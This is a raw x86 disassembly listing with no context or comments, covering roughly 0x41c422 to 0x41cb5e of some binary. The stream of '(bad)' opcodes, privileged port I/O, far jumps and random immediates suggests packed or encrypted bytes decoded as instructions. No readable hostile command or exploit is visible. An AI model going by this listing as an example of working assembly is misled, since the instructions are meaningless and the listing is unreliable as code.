  41c422:	adc    DWORD PTR [esi+edi*2+0x4cbd418],ebp
  41c429:	add    al,0xb1
  41c42b:	xchg   ebp,eax
  41c42c:	bound  esp,QWORD PTR [ecx]
  41c42e:	outs   dx,DWORD PTR ds:[esi]
  41c42f:	ror    BYTE PTR [edx],1
  41c431:	sbb    BYTE PTR [edi],al
  41c433:	aas    
  41c434:	test   eax,0x3cb9bb65
  41c439:	rcr    DWORD PTR [esi+0x2f],1
  41c43c:	mov    WORD PTR [ecx],fs
  41c43e:	fwait
  41c43f:	pop    es
  41c440:	in     eax,0xc8
  41c442:	xchg   esi,eax
  41c443:	sbb    al,0xfb
  41c445:	daa    
  41c446:	test   al,0xa2
  41c448:	add    BYTE PTR [edi],al
  41c44a:	adc    DWORD PTR [esi],0xffffffcd
  41c44d:	fcomp  QWORD PTR [ebp-0x77662491]
  41c453:	push   ebx
  41c454:	cwde   
  41c455:	dec    ecx
  41c456:	fld    QWORD PTR [ebx+0x65]
  41c459:	cwde   
  41c45a:	sub    al,BYTE PTR ds:0x12d535f3
  41c460:	ret    0x7dd1
  41c463:	inc    edx
  41c464:	pop    eax
  41c465:	ins    BYTE PTR es:[edi],dx
  41c466:	mov    al,ds:0x81c3174d
  41c46b:	out    0xeb,al
  41c46d:	mov    ebp,0xfe9b18d3
  41c472:	dec    ecx
  41c473:	je     0x41c48c
  41c475:	rcl    esi,cl
  41c477:	push   edi
  41c478:	pop    ebx
  41c479:	jae    0x41c4cc
  41c47b:	(bad)  
  41c47c:	outs   dx,DWORD PTR ds:[esi]
  41c47d:	cmp    al,0xbe
  41c47f:	jae    0x41c41d
  41c481:	cmp    eax,0x77dcebb0
  41c486:	sub    ah,BYTE PTR es:0x219bee13
  41c48d:	sbb    BYTE PTR [ebp-0x3e0e1b7a],dl
  41c493:	in     eax,dx
  41c494:	mov    ds:0x952e7372,eax
  41c499:	scas   al,BYTE PTR es:[edi]
  41c49a:	dec    esp
  41c49b:	push   edi
  41c49c:	and    BYTE PTR [ebx-0x80],ah
  41c49f:	imul   edx,DWORD PTR [edi-0x38677967],0xa5b96047
  41c4a9:	mov    esp,0x3ff1ca2
  41c4ae:	mov    ds:0x65c1697d,eax
  41c4b3:	mov    WORD PTR [edi+0x3a0d54e8],es
  41c4b9:	test   eax,0x95882a24
  41c4be:	add    BYTE PTR [edi-0x42dedebb],0xdb
  41c4c5:	pusha  
  41c4c6:	push   eax
  41c4c7:	xchg   ecx,eax
  41c4c8:	shl    DWORD PTR [edx+eiz*4],1
  41c4cb:	xor    BYTE PTR [ebp-0x4f],bh
  41c4ce:	mov    eax,ds:0x6b332f60
  41c4d3:	add    ah,bh
  41c4d5:	ret    0xd8a4
  41c4d8:	mov    ebx,0x3510704b
  41c4dd:	out    dx,eax
  41c4de:	and    al,0x93
  41c4e0:	ins    DWORD PTR es:[edi],dx
  41c4e1:	mov    ah,0xb7
  41c4e3:	cli    
  41c4e4:	mov    al,0x8b
  41c4e6:	outs   dx,DWORD PTR ds:[esi]
  41c4e7:	jno    0x41c49f
  41c4e9:	shl    BYTE PTR [ebx],1
  41c4eb:	jle    0x41c505
  41c4ed:	xchg   ebx,edx
  41c4ef:	cld    
  41c4f0:	mov    edx,0x7736481f
  41c4f5:	mov    esi,0xd122ca43
  41c4fa:	and    eax,0x6cd39a9b
  41c4ff:	push   cs
  41c500:	jg     0x41c4c7
  41c502:	sbb    eax,0xb83d7ec5
  41c507:	fisttp QWORD PTR [ecx+0x3]
  41c50a:	sbb    cl,cl
  41c50c:	push   ds
  41c50d:	or     eax,0x5e198bd7
  41c512:	add    esi,eax
  41c514:	cld    
  41c515:	aas    
  41c516:	jno    0x41c563
  41c518:	fnstsw WORD PTR [edx+0x5c]
  41c51b:	push   0x52f7e243
  41c520:	lahf   
  41c521:	lods   al,BYTE PTR ds:[si]
  41c523:	mov    BYTE PTR [esi],cl
  41c525:	scas   al,BYTE PTR es:[edi]
  41c526:	pop    esp
  41c527:	adc    BYTE PTR [edi],bh
  41c529:	jns    0x41c562
  41c52b:	xchg   cl,dl
  41c52d:	rcl    esp,cl
  41c52f:	mov    ah,BYTE PTR [edx+eiz*4-0x68b70c62]
  41c536:	or     BYTE PTR [ecx-0x32],ch
  41c539:	mov    ecx,0xf49850af
  41c53e:	mov    bl,BYTE PTR [edx+0x2c]
  41c541:	sbb    al,0x91
  41c543:	adc    eax,0x25fe5ea2
  41c548:	fbstp  TBYTE PTR [edx+0x9]
  41c54b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c54c:	outs   dx,DWORD PTR ds:[esi]
  41c54d:	ret    0xe903
  41c550:	clc    
  41c551:	int    0xba
  41c553:	fcom   QWORD PTR [ebp+0x53f989de]
  41c559:	jmp    0x41c5c1
  41c55b:	and    DWORD PTR [ecx],edx
  41c55d:	loop   0x41c5ba
  41c55f:	pop    esp
  41c560:	inc    esi
  41c561:	sub    al,0xd6
  41c563:	push   eax
  41c564:	in     al,0x7
  41c566:	or     BYTE PTR [ecx],dh
  41c568:	dec    ebp
  41c569:	call   0xa892:0xa9689bc9
  41c570:	xor    bl,dh
  41c572:	sub    dh,ah
  41c574:	hlt    
  41c575:	pop    es
  41c576:	dec    ecx
  41c577:	dec    ecx
  41c578:	and    eax,0x48529bb3
  41c57d:	mov    al,ds:0x7091d524
  41c582:	push   0x1c
  41c584:	jae    0x41c5ba
  41c586:	cmc    
  41c587:	sbb    ch,BYTE PTR [ebx+edx*2+0x15]
  41c58b:	xadd   DWORD PTR [esi-0x5e],eax
  41c58f:	and    dh,BYTE PTR [edx-0x73]
  41c592:	and    al,0x2d
  41c594:	rcr    BYTE PTR [edi],1
  41c596:	push   ebp
  41c597:	loopne 0x41c612
  41c599:	dec    DWORD PTR [edi+0x5]
  41c59c:	add    esi,DWORD PTR [esi]
  41c59e:	lods   eax,DWORD PTR ds:[esi]
  41c59f:	int3   
  41c5a0:	cs sbb al,0x14
  41c5a3:	adc    eax,0xcae51233
  41c5a8:	arpl   WORD PTR [esi],dx
  41c5aa:	mov    ebx,0xd7d383ef
  41c5af:	inc    esp
  41c5b0:	fldcw  WORD PTR [edx]
  41c5b2:	test   BYTE PTR [ebp-0x79],bl
  41c5b5:	push   0xe68b1046
  41c5ba:	fstp   TBYTE PTR [eax-0x570fb046]
  41c5c0:	cmp    al,0xa0
  41c5c2:	xchg   ebp,eax
  41c5c3:	mov    WORD PTR [edx+0x41],ds
  41c5c6:	mov    ebx,DWORD PTR [edx-0x65e15164]
  41c5cc:	or     al,0x8a
  41c5ce:	push   edi
  41c5cf:	adc    DWORD PTR [eax-0x7b57e661],eax
  41c5d5:	jnp    0x41c5a2
  41c5d7:	push   0xffffff85
  41c5d9:	dec    ebx
  41c5da:	jo     0x41c5b9
  41c5dc:	jbe    0x41c59b
  41c5de:	pushf  
  41c5df:	bound  esi,QWORD PTR [edx]
  41c5e1:	jno    0x41c628
  41c5e3:	mov    edi,0x8ed86c5a
  41c5e8:	aam    0x72
  41c5ea:	push   eax
  41c5eb:	fisubr DWORD PTR [esi+0x1ea43ef1]
  41c5f1:	mov    ds:0x8d462232,al
  41c5f6:	inc    ebx
  41c5f7:	int3   
  41c5f8:	mov    ds:0x9ea1cf66,al
  41c5fd:	test   bl,0x29
  41c600:	lods   eax,DWORD PTR ds:[esi]
  41c601:	jp     0x41c67d
  41c603:	jno    0x41c62f
  41c605:	mov    bh,0x1c
  41c607:	pop    esi
  41c608:	mov    eax,ds:0x17f38023
  41c60d:	mov    ds:0xa2c506b1,eax
  41c612:	mov    ah,0x98
  41c614:	push   0xd3dcf4d5
  41c619:	(bad)  
  41c61b:	or     al,0xd8
  41c61d:	or     BYTE PTR [ebp+0x78],cl
  41c620:	aaa    
  41c621:	std    
  41c622:	xchg   ebx,eax
  41c623:	fcom   DWORD PTR [edi+0x44]
  41c626:	inc    ebp
  41c627:	adc    DWORD PTR gs:[ebp+0x74],esi
  41c62b:	inc    edi
  41c62c:	ror    bh,0x50
  41c62f:	xchg   esi,eax
  41c630:	inc    eax
  41c631:	mov    cl,0xd7
  41c633:	aad    0xd5
  41c635:	mov    edi,0x269977cb
  41c63a:	jmp    0x41c662
  41c63c:	(bad)  
  41c63d:	out    dx,eax
  41c63e:	dec    esi
  41c63f:	xchg   esp,eax
  41c640:	mov    bh,0x28
  41c642:	cld    
  41c643:	std    
  41c644:	clc    
  41c645:	(bad)  
  41c646:	enter  0xdb2b,0x9b
  41c64a:	push   eax
  41c64b:	mov    esi,0x9d2c8799
  41c650:	sbb    cl,BYTE PTR [ecx-0x6d]
  41c653:	xchg   esi,eax
  41c654:	cli    
  41c655:	adc    esi,DWORD PTR [ebx]
  41c657:	sub    bl,BYTE PTR [esi+ecx*4+0x4a04f29e]
  41c65e:	xor    al,0x68
  41c660:	sub    esi,0x39
  41c663:	cdq    
  41c664:	mov    ds:0xb3cb68fd,eax
  41c669:	mov    ds:0x4957365a,al
  41c66e:	pop    ecx
  41c66f:	inc    ebx
  41c670:	inc    edx
  41c671:	(bad)  
  41c672:	std    
  41c673:	pop    edx
  41c674:	icebp  
  41c675:	and    edi,DWORD PTR [edx]
  41c677:	mov    es,WORD PTR [edi+ebx*2]
  41c67a:	push   ecx
  41c67b:	sub    al,0xab
  41c67d:	mov    al,0xd6
  41c67f:	add    eax,0x9e6484b1
  41c684:	cld    
  41c685:	ss aad 0x82
  41c688:	test   dh,ah
  41c68a:	jp     0x41c6a9
  41c68c:	push   0xadde9dac
  41c691:	outs   dx,BYTE PTR ds:[esi]
  41c692:	push   ss
  41c693:	stc    
  41c694:	jge    0x41c6ae
  41c696:	das    
  41c697:	int    0xde
  41c699:	dec    ecx
  41c69a:	xor    DWORD PTR [edx+0x0],eax
  41c69d:	dec    esi
  41c69e:	or     DWORD PTR [edx+eiz*8+0x23],ebx
  41c6a2:	daa    
  41c6a3:	leave  
  41c6a4:	lahf   
  41c6a5:	xor    ch,BYTE PTR [ecx+0x63]
  41c6a8:	or     BYTE PTR [ebx-0x2d584431],0x9
  41c6af:	or     eax,0xdbea6ea0
  41c6b4:	push   0x78f60a0b
  41c6b9:	idiv   bl
  41c6bb:	mov    edx,0x4d48b2f0
  41c6c0:	pop    edi
  41c6c1:	jmp    0x41c6cb
  41c6c3:	sub    BYTE PTR [edx-0x30],al
  41c6c6:	iret   
  41c6c7:	xchg   ebp,edx
  41c6c9:	jp     0x41c6bb
  41c6cb:	xchg   edx,eax
  41c6cc:	jbe    0x41c699
  41c6ce:	or     esi,eax
  41c6d0:	dec    bx
  41c6d2:	sbb    ah,bl
  41c6d4:	sub    al,bl
  41c6d6:	inc    esp
  41c6d7:	mov    eax,0x76f7a23c
  41c6dc:	jge    0x41c695
  41c6de:	xchg   esi,eax
  41c6df:	inc    esi
  41c6e0:	ret    
  41c6e1:	ret    
  41c6e2:	fsub   QWORD PTR [eax]
  41c6e4:	fxch   st(5)
  41c6e6:	inc    esi
  41c6e7:	enter  0xf8d5,0xb6
  41c6eb:	dec    ecx
  41c6ec:	das    
  41c6ed:	push   edi
  41c6ee:	add    ebx,DWORD PTR [edx-0x56efe911]
  41c6f4:	mov    cs,WORD PTR [ecx+0x4b]
  41c6f7:	rol    dh,1
  41c6f9:	popa   
  41c6fa:	or     BYTE PTR [eax+edx*8-0x4f],ch
  41c6fe:	je     0x41c6bf
  41c700:	sbb    al,0xfd
  41c702:	mov    cr6,ebx
  41c705:	xor    BYTE PTR [eax],ch
  41c707:	into   
  41c708:	dec    ecx
  41c709:	push   es
  41c70a:	repz xchg esi,eax
  41c70c:	or     BYTE PTR [ecx+edi*8-0x1dee99cd],dl
  41c713:	or     bh,BYTE PTR [edi]
  41c715:	push   eax
  41c716:	adc    bh,cl
  41c718:	mov    esi,0x7ffbabd8
  41c71d:	add    ecx,DWORD PTR [ebp+0x7f]
  41c720:	or     edi,ebx
  41c722:	(bad)  
  41c724:	stos   DWORD PTR es:[edi],eax
  41c725:	mov    ch,0x97
  41c727:	into   
  41c728:	or     ebx,edx
  41c72a:	xchg   ebp,eax
  41c72b:	pop    ss
  41c72c:	call   0x2375:0xa1c7f034
  41c733:	inc    eax
  41c734:	sbb    bl,BYTE PTR [eax+0x51]
  41c737:	stc    
  41c738:	lahf   
  41c739:	sahf   
  41c73a:	lahf   
  41c73b:	push   esp
  41c73c:	cmp    DWORD PTR [eax],ebp
  41c73e:	jnp    0x41c7b8
  41c740:	xchg   ebx,eax
  41c741:	fld    DWORD PTR [edi+0x64c1ba31]
  41c747:	sbb    al,0x7c
  41c749:	xchg   esp,eax
  41c74a:	inc    esp
  41c74b:	stos   BYTE PTR es:[edi],al
  41c74c:	sbb    DWORD PTR [edx],esi
  41c74e:	fild   DWORD PTR [ebp-0x2689c88d]
  41c754:	fsincos 
  41c756:	pop    esi
  41c757:	ret    
  41c758:	fadd   QWORD PTR [ebx+eax*8+0x1a39032b]
  41c75f:	cmp    bh,ah
  41c761:	xchg   esp,eax
  41c762:	outs   dx,DWORD PTR ds:[esi]
  41c763:	jl     0x41c7e3
  41c765:	shl    BYTE PTR [edi-0x722c27cc],cl
  41c76b:	xor    al,0x94
  41c76d:	adc    ch,ah
  41c76f:	aam    0x4d
  41c771:	test   eax,0x3f3f2287
  41c776:	jge    0x41c79a
  41c778:	mov    dl,0xe7
  41c77a:	out    dx,al
  41c77b:	data16 test dh,bh
  41c77e:	and    cl,al
  41c780:	repz fisttp DWORD PTR [esi-0x8]
  41c784:	mov    ebx,DWORD PTR [ecx+0x2d]
  41c787:	rcl    dh,0xca
  41c78a:	pop    ds
  41c78b:	adc    cl,BYTE PTR [eax]
  41c78d:	pop    es
  41c78e:	pop    ebx
  41c78f:	mov    ds:0x885eb7e2,al
  41c794:	fcom   DWORD PTR [esi+0x72]
  41c797:	popa   
  41c798:	cli    
  41c799:	sub    ebx,DWORD PTR [ebx]
  41c79b:	cli    
  41c79c:	leave  
  41c79d:	(bad)  
  41c79f:	mov    eax,0x4bc10283
  41c7a4:	pushf  
  41c7a5:	ss ins BYTE PTR es:[edi],dx
  41c7a7:	add    ecx,DWORD PTR [esi-0x78a70969]
  41c7ad:	push   edx
  41c7ae:	movlps QWORD PTR [edx+0x53],xmm4
  41c7b2:	jnp    0x41c830
  41c7b4:	and    eax,0xe41635bd
  41c7b9:	push   ebx
  41c7ba:	cmp    al,0xb6
  41c7bc:	(bad)
  41c7bf:	out    0x1c,eax
  41c7c1:	scas   al,BYTE PTR es:[edi]
  41c7c2:	mov    WORD PTR [edx+0x3a],?
  41c7c5:	repz cli 
  41c7c7:	pop    esi
  41c7c8:	add    eax,0xdcff1ecb
  41c7cd:	fwait
  41c7ce:	xchg   BYTE PTR [ebp-0x41],bh
  41c7d1:	iret   
  41c7d2:	sub    al,0xcb
  41c7d4:	mov    al,0x13
  41c7d6:	lods   al,BYTE PTR ds:[esi]
  41c7d7:	test   eax,0xad025f3
  41c7dc:	fld    DWORD PTR [ebp+0x39]
  41c7df:	sub    eax,0xc5b4b3f
  41c7e4:	into   
  41c7e5:	mov    ecx,0xec453136
  41c7ea:	jle    0x41c822
  41c7ec:	jbe    0x41c803
  41c7ee:	xor    dh,BYTE PTR [edx]
  41c7f0:	in     al,0x43
  41c7f2:	mov    eax,0x9dbca51d
  41c7f7:	inc    edi
  41c7f8:	push   cs
  41c7f9:	sub    ah,bh
  41c7fb:	adc    dl,ch
  41c7fd:	out    dx,al
  41c7fe:	shl    BYTE PTR [esi],cl
  41c800:	lahf   
  41c801:	mov    eax,0x10d83a57
  41c806:	cmp    bh,BYTE PTR [ebx-0x4f6e2b79]
  41c80c:	stc    
  41c80d:	push   di
  41c80f:	out    0xeb,eax
  41c811:	loop   0x41c7b3
  41c813:	xor    ah,BYTE PTR [edi+0x1caa5e9a]
  41c819:	js     0x41c892
  41c81b:	cwde   
  41c81c:	imul   edx,DWORD PTR [ebx+ecx*8],0x9
  41c820:	adc    al,0xf4
  41c822:	sub    al,0x85
  41c824:	loope  0x41c86f
  41c826:	ins    BYTE PTR es:[edi],dx
  41c827:	(bad)  
  41c828:	mov    es,WORD PTR [esi-0x5821daaf]
  41c82e:	aas    
  41c82f:	xchg   ebp,eax
  41c830:	in     eax,0x80
  41c832:	or     eax,0xf69a24ff
  41c837:	addr16 xor al,ch
  41c83a:	dec    edx
  41c83b:	xor    eax,0xc17e5aab
  41c840:	mov    dl,0x3
  41c842:	pop    ds
  41c843:	dec    esp
  41c844:	mov    ah,0x68
  41c846:	xchg   edx,eax
  41c847:	dec    edx
  41c848:	sbb    bl,BYTE PTR [esi+0x26]
  41c84b:	cwde   
  41c84c:	lods   al,BYTE PTR cs:[esi]
  41c84e:	cmc    
  41c84f:	xchg   BYTE PTR [ecx-0x75],dh
  41c852:	adc    ebp,esi
  41c854:	add    al,0xc5
  41c856:	ret    0x378e
  41c859:	div    BYTE PTR ds:0xe29f1385
  41c85f:	adc    al,0x44
  41c861:	sbb    al,0x4e
  41c863:	std    
  41c864:	fwait
  41c865:	pop    ebx
  41c866:	jp     0x41c8e1
  41c868:	mov    dh,0x1a
  41c86a:	ins    DWORD PTR es:[edi],dx
  41c86b:	repnz and eax,0x1622df42
  41c871:	fadd   st,st(2)
  41c873:	aad    0x3
  41c875:	cmp    BYTE PTR [esi-0x1b8ae7a0],dh
  41c87b:	mov    al,BYTE PTR [edx+0x6f]
  41c87e:	mov    bl,BYTE PTR [ebp+0x1f]
  41c881:	addr16 enter 0x2a73,0xd5
  41c886:	aam    0x68
  41c888:	sub    al,0xfc
  41c88a:	add    esi,DWORD PTR [ebx-0x190ae843]
  41c890:	inc    eax
  41c891:	mov    ch,0x8e
  41c893:	adc    esp,DWORD PTR [edx+0x13d85a9a]
  41c899:	in     al,dx
  41c89a:	add    ebp,DWORD PTR [ebx-0x46]
  41c89d:	scas   eax,DWORD PTR es:[edi]
  41c89e:	dec    ecx
  41c89f:	xchg   esp,eax
  41c8a0:	cmp    al,0xb5
  41c8a2:	in     al,dx
  41c8a3:	mov    DWORD PTR [esi+0x18],edx
  41c8a6:	add    eax,DWORD PTR [esi+0x659a8247]
  41c8ac:	retf   0x9c7
  41c8af:	data16 sbb ah,cl
  41c8b2:	add    BYTE PTR [eax+0x5a],dl
  41c8b5:	dec    esp
  41c8b6:	inc    esi
  41c8b7:	inc    ecx
  41c8b8:	mov    ecx,DWORD PTR [eax+0xb]
  41c8bb:	aaa    
  41c8bc:	ret    0xc2b6
  41c8bf:	add    al,0xbc
  41c8c1:	sti    
  41c8c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8c3:	int3   
  41c8c4:	ins    DWORD PTR es:[edi],dx
  41c8c5:	(bad)  
  41c8c6:	adc    ecx,esp
  41c8c8:	xchg   ebp,eax
  41c8c9:	pop    ds
  41c8ca:	pop    esp
  41c8cb:	pandn  mm5,QWORD PTR [eax-0x7a]
  41c8cf:	int3   
  41c8d0:	cmp    eax,0xf99302eb
  41c8d5:	add    BYTE PTR [ebx-0x7f4c71ff],al
  41c8db:	mov    DWORD PTR ds:0x7be88741,ecx
  41c8e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8e2:	sti    
  41c8e3:	sar    DWORD PTR [ebx],cl
  41c8e5:	sti    
  41c8e6:	jmp    0x41c95b
  41c8e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c8e9:	jge    0x41c8a6
  41c8eb:	inc    esp
  41c8ec:	pmulhuw mm7,QWORD PTR [edx+0x1b]
  41c8f0:	push   ds
  41c8f1:	in     eax,dx
  41c8f2:	mov    eax,ds:0xcc4628e
  41c8f7:	mov    eax,ds:0x1e2a5ec0
  41c8fc:	lods   eax,DWORD PTR ds:[esi]
  41c8fd:	scas   eax,DWORD PTR es:[edi]
  41c8fe:	adc    DWORD PTR [edi+0x65],0xd6c92dfa
  41c905:	fisub  WORD PTR [edx+eiz*2+0x624dd4d8]
  41c90c:	cmp    edi,DWORD PTR [esi-0x1311c094]
  41c912:	in     al,dx
  41c913:	inc    BYTE PTR [ebp+0x69]
  41c916:	mov    al,0xb
  41c918:	hlt    
  41c919:	inc    edx
  41c91a:	mov    es,esp
  41c91c:	cdq    
  41c91d:	add    BYTE PTR ds:0x18cd573c,dh
  41c923:	jne    0x41c956
  41c925:	sub    bh,dh
  41c927:	add    eax,DWORD PTR [edi-0x56]
  41c92a:	push   esi
  41c92b:	popa   
  41c92c:	outs   dx,BYTE PTR ds:[esi]
  41c92d:	xor    al,BYTE PTR [eax+ebx*1-0x5b]
  41c931:	gs dec ebx
  41c933:	in     al,dx
  41c934:	lods   al,BYTE PTR ds:[esi]
  41c935:	(bad)  
  41c936:	mov    WORD PTR [eax],?
  41c938:	inc    DWORD PTR [ebx+0x11]
  41c93b:	stc    
  41c93c:	adc    eax,0xb9a16312
  41c941:	sbb    DWORD PTR [ecx-0x226b7b4],ecx
  41c947:	fxch   st(6)
  41c949:	sbb    ecx,DWORD PTR [ecx]
  41c94b:	enter  0xf82,0x9
  41c94f:	jo     0x41c94c
  41c951:	imul   ebx,DWORD PTR [ecx-0x2d5e8619],0xffffffc8
  41c958:	cmp    edx,DWORD PTR [esi-0x5c]
  41c95b:	mov    bh,BYTE PTR [edx-0x2c]
  41c95e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c95f:	fld    QWORD PTR [edi+eax*8+0x2]
  41c963:	inc    ebx
  41c964:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c965:	push   esp
  41c966:	sub    eax,0x186ce8e3
  41c96b:	test   BYTE PTR [ecx-0x4c0d15d9],0xbf
  41c972:	or     esp,eax
  41c974:	adc    DWORD PTR [ebx],edi
  41c976:	adc    al,0x86
  41c978:	fisubr DWORD PTR [esi]
  41c97a:	sub    bh,ch
  41c97c:	aas    
  41c97d:	pop    ebp
  41c97e:	and    esi,DWORD PTR [ebx+0x4a]
  41c981:	mov    dl,0x5a
  41c983:	daa    
  41c984:	outs   dx,BYTE PTR ds:[esi]
  41c985:	sbb    DWORD PTR [ebp+0x55076f48],eax
  41c98b:	int    0xc
  41c98d:	es scas al,BYTE PTR es:[edi]
  41c98f:	adc    al,BYTE PTR [edx-0x73721665]
  41c995:	sti    
  41c996:	repz mov edx,DWORD PTR [edx+0x3]
  41c99a:	xchg   esp,edx
  41c99c:	pop    edx
  41c99d:	pop    esi
  41c99e:	xchg   ebp,eax
  41c99f:	fwait
  41c9a0:	sahf   
  41c9a1:	fld    TBYTE PTR [eax-0x50bede1b]
  41c9a7:	aam    0x70
  41c9a9:	cmp    DWORD PTR [ecx+0x51],ebp
  41c9ac:	pop    esi
  41c9ad:	jg     0x41c937
  41c9af:	lock ss push 0xffffffd4
  41c9b3:	repnz push eax
  41c9b5:	shl    DWORD PTR [edi-0x579a5144],cl
  41c9bb:	std    
  41c9bc:	hlt    
  41c9bd:	add    al,0x79
  41c9bf:	push   es
  41c9c0:	jnp    0x41c9c7
  41c9c2:	aam    0xd5
  41c9c4:	icebp  
  41c9c5:	jne    0x41c9b4
  41c9c7:	cld    
  41c9c8:	je     0x41ca24
  41c9ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9cb:	xor    BYTE PTR [edx-0x43575b5d],cl
  41c9d1:	mov    BYTE PTR [eax+0x4f7356e5],0x50
  41c9d8:	out    dx,al
  41c9d9:	or     ebp,0x1b89e99e
  41c9df:	push   0x71a15fc4
  41c9e4:	ins    BYTE PTR es:[edi],dx
  41c9e5:	lods   eax,DWORD PTR ds:[esi]
  41c9e6:	scas   al,BYTE PTR es:[edi]
  41c9e7:	out    0xc9,eax
  41c9e9:	arpl   sp,cx
  41c9eb:	pop    ds
  41c9ec:	data16 in al,dx
  41c9ee:	out    0x8e,al
  41c9f0:	out    0x50,eax
  41c9f2:	fcmovnu st,st(7)
  41c9f4:	pop    esp
  41c9f5:	fs xchg esi,eax
  41c9f7:	outs   dx,BYTE PTR ds:[esi]
  41c9f8:	jbe    0x41c980
  41c9fa:	and    al,0x47
  41c9fc:	pop    edi
  41c9fd:	mov    ss,WORD PTR [edi+ebx*1]
  41ca00:	ins    DWORD PTR es:[edi],dx
  41ca01:	loop   0x41c9e6
  41ca03:	mov    ds:0x7207778c,eax
  41ca08:	sbb    BYTE PTR [edi+0x4a],0x8e
  41ca0c:	push   ds
  41ca0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca0e:	iret   
  41ca0f:	fdivr  st,st(6)
  41ca11:	ja     0x41ca0f
  41ca13:	fisttp QWORD PTR [ecx]
  41ca15:	bound  ebx,QWORD PTR [ebx+eax*4]
  41ca18:	lods   eax,DWORD PTR ds:[esi]
  41ca19:	pop    eax
  41ca1a:	push   eax
  41ca1b:	adc    bh,dh
  41ca1d:	cmp    dh,BYTE PTR [eax-0x457f4ef5]
  41ca23:	mov    ebx,0x9534db36
  41ca28:	mov    edx,0xbfcd217b
  41ca2d:	enter  0xc311,0xab
  41ca31:	jecxz  0x41ca8a
  41ca33:	cwde   
  41ca34:	ds invd 
  41ca37:	jae    0x41c9ef
  41ca39:	(bad)  
  41ca3a:	and    eax,0x7345f6b1
  41ca3f:	fldpi  
  41ca41:	and    BYTE PTR [ebp+0x4f9fca3],bl
  41ca47:	add    DWORD PTR ds:0xcb9062db,ebp
  41ca4d:	daa    
  41ca4e:	mov    dl,dl
  41ca50:	jmp    0xc81c:0x1e921f90
  41ca57:	out    dx,eax
  41ca58:	shl    eax,cl
  41ca5a:	fcmove st,st(5)
  41ca5c:	fwait
  41ca5d:	outs   dx,DWORD PTR ds:[esi]
  41ca5e:	out    dx,al
  41ca5f:	stc    
  41ca60:	ins    BYTE PTR es:[edi],dx
  41ca61:	jecxz  0x41c9fb
  41ca63:	and    DWORD PTR [esi-0x262df329],ecx
  41ca69:	pop    es
  41ca6a:	enter  0x7123,0x7a
  41ca6e:	cmp    BYTE PTR [ecx-0x4f],0x19
  41ca72:	gs ss cmp al,0x6
  41ca76:	adc    eax,0x7291e925
  41ca7b:	dec    edi
  41ca7c:	pop    ds
  41ca7d:	pop    eax
  41ca7e:	dec    esp
  41ca7f:	lock sub edi,DWORD PTR [edx-0x1]
  41ca83:	sti    
  41ca84:	and    eax,0x9fc6ccb5
  41ca89:	adc    al,0x89
  41ca8b:	inc    esi
  41ca8c:	icebp  
  41ca8d:	jg     0x41caaa
  41ca8f:	sbb    al,0x4b
  41ca91:	sbb    al,BYTE PTR [edi+0x44ce61f3]
  41ca97:	inc    esi
  41ca98:	xor    dl,BYTE PTR [ecx]
  41ca9a:	pop    edi
  41ca9b:	loopne 0x41ca76
  41ca9d:	push   cs
  41ca9e:	xchg   esp,eax
  41ca9f:	ins    BYTE PTR es:[edi],dx
  41caa0:	jl     0x41caab
  41caa2:	xchg   ebx,eax
  41caa3:	dec    ebp
  41caa4:	inc    edi
  41caa5:	retf   0x47e0
  41caa8:	xchg   esp,eax
  41caa9:	sub    DWORD PTR [ecx-0x21],esp
  41caac:	fsubr  QWORD PTR [ebx]
  41caae:	mov    eax,0x2b64f3fa
  41cab3:	inc    edi
  41cab4:	and    edi,DWORD PTR [ecx-0x43a23960]
  41caba:	in     al,dx
  41cabb:	fcmovu st,st(2)
  41cabd:	push   0x6c
  41cabf:	(bad)  
  41cac0:	fcmovb st,st(2)
  41cac2:	cli    
  41cac3:	mov    cl,0xbb
  41cac5:	or     BYTE PTR [edx-0x7dca64f6],0xf4
  41cacc:	ins    BYTE PTR es:[edi],dx
  41cacd:	jbe    0x41cb33
  41cacf:	dec    ebp
  41cad0:	loop   0x41ca8e
  41cad2:	xor    BYTE PTR [edx],dl
  41cad4:	nop
  41cad5:	mov    dl,0xb3
  41cad7:	mov    cl,0xc4
  41cad9:	out    dx,al
  41cada:	and    al,0xdb
  41cadc:	fsubr  DWORD PTR [ecx-0x6a]
  41cadf:	dec    esi
  41cae0:	out    0xd0,al
  41cae2:	je     0x41cb21
  41cae4:	jno    0x41cb0f
  41cae6:	out    0xbd,eax
  41cae8:	enter  0xc97d,0x9c
  41caec:	pop    esi
  41caed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41caee:	ds out dx,eax
  41caf0:	cld    
  41caf1:	dec    eax
  41caf2:	fist   WORD PTR [edx-0x78696eb0]
  41caf8:	jne    0x41ca9e
  41cafa:	jnp    0x41ca80
  41cafc:	inc    ecx
  41cafd:	mov    dl,0xc7
  41caff:	(bad)  ds:0xba1046e0
  41cb05:	push   ebx
  41cb06:	mov    ebp,0xb234b733
  41cb0b:	mov    bl,0x9f
  41cb0d:	pusha  
  41cb0e:	push   eax
  41cb0f:	out    0x9b,al
  41cb11:	test   DWORD PTR [ecx+0x374c0403],esi
  41cb17:	ror    BYTE PTR [edx+0x4e203ef5],1
  41cb1d:	adc    DWORD PTR [esi],esp
  41cb1f:	aam    0x7
  41cb21:	out    dx,al
  41cb22:	jns    0x9c207965
  41cb28:	bound  esp,QWORD PTR [esi]
  41cb2a:	xor    DWORD PTR [ecx],edx
  41cb2c:	mov    eax,0xded7066e
  41cb31:	into   
  41cb32:	sub    eax,0x338368b7
  41cb37:	or     dl,BYTE PTR [eax-0x155ee5d9]
  41cb3d:	dec    edi
  41cb3e:	mov    ah,0xde
  41cb40:	add    BYTE PTR [edi+0x58],cl
  41cb43:	push   esi
  41cb44:	call   DWORD PTR [esi+0x6887136a]
  41cb4a:	lock xchg edx,eax
  41cb4c:	push   ecx
  41cb4d:	and    DWORD PTR [edi-0x45],esi
  41cb50:	pop    ebx
  41cb51:	mov    eax,0xdbfd7860
  41cb56:	stc    
  41cb57:	sbb    esp,edx
  41cb59:	rcr    ah,0xdc
  41cb5c:	es pushf 
  41cb5e:	ja     0x41cae3
